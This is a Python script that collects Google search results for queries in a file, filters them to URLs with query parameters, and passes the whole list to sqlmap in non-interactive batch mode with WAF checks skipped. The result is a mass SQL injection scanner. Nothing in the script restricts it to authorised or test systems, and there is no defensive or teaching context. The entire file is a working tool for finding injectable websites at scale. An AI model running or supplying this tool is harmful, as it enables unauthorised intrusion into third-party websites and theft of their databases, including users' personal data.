import os
import re
import subprocess
import time
from selenium import webdriver
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.firefox.options import Options
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def google_search(query, max_pages=10):
    urls = set()  # Use a set to avoid duplicates
    firefox_options = Options()
    
    driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()), options=firefox_options)
    
    for page in range(max_pages):
        start = page * 10
        search_url = f"https://www.google.com/search?q={query}&start={start}"
        driver.get(search_url)
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_all_elements_located((By.XPATH, "//a[@jsname='UWckNb']"))
            )
            result_blocks = driver.find_elements(By.XPATH, "//a[@jsname='UWckNb']")
            print(f"Query: {query} | Page {page + 1}: Found {len(result_blocks)} links.")
            for block in result_blocks:
                try:
                    href = block.get_attribute("href")
                    if href and re.search(r"=\S+$", href) and href not in urls:
                        urls.add(href)
                        print(f"Found URL: {href}")
                except Exception as e:
                    print(f"Error retrieving link: {e}")
        except Exception as e:
            print(f"Error loading results: {e}")
            break
    driver.quit()
    return urls

def save_urls_to_file(urls, filename='urls.txt'):
    with open(filename, 'w') as f:
        for url in urls:
            f.write(url + '\n')

def load_queries_from_file(filename):
    with open(filename, 'r') as f:
        queries = f.readlines()
    return [query.strip() for query in queries if query.strip()]

def clear_file(filename):
    open(filename, 'w').close()  # Clear the file

if __name__ == "__main__":
    query_file = 'queries.txt'  
    result_file = 'urls.txt'     

    clear_file(result_file)

    queries = load_queries_from_file(query_file)
    all_urls = []
    for query in queries:
        if query:
            result_urls = google_search(query, max_pages=10)
            all_urls.extend(result_urls)

    save_urls_to_file(all_urls, result_file)
    print(f"Saved {len(all_urls)} URLs to {result_file}.")

    sqlmap_command = f"sqlmap -m {result_file} --skip=SKIP --skip-waf --cookie=COOKIE --batch --output-dir=results --results-file=vulnerable_urls.txt"
    print("Running command:", sqlmap_command)
    
    os.system(sqlmap_command)


